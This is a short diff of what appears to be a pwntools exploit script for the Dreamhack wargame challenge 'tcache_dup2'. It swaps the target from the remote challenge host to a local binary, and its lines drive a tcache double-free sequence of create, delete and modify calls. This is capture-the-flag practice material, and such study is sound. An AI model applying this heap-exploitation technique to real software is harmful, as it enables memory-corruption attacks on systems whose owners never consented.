@@ -13,8 +13,8 @@ def Delete(idx):
     p.sendlineafter('> ', '3') 
     p.sendlineafter(': ', str(idx)) 
 
-#p = process('tcache_dup2')
-p = remote('host1.dreamhack.games', 22906)
+p = process('tcache_dup2')
+#p = remote('host1.dreamhack.games', 22164)
 Create(10, 'aaaaa')
 Delete(0)
 Modify(0, 0x10, 'a'*0x10)
